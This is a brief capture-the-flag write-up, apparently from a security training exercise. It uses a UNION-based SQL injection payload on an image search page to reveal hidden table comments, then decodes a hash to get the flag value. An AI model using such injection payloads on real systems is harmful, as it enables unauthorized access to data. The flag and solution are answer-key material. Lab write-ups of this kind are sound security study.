# SQL Injection

Following our first SQL injection attack, it allowed us to get a lot of useful info, notably about the following table:

|list_images||||
|:-:|:-:|:-:|:-:|
|id|url|title|comment|

The searchimg page we are now on apparently allows us to search for images based off of their ids. However, we can only see their title and url, not the comment. Guess we have to do some SQL Injection again :D
```
ID: 1 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
```
The following SQL Injection allows us to see the url and comment of every line in the list_images table.
```
1=2 UNION ALL SELECT url, comment FROM list_images
```
We find one very interesting comment as follows:
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

## Flag

Following the instructions, we get the word `albatroz` which hashed in SHA256 gives us:
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```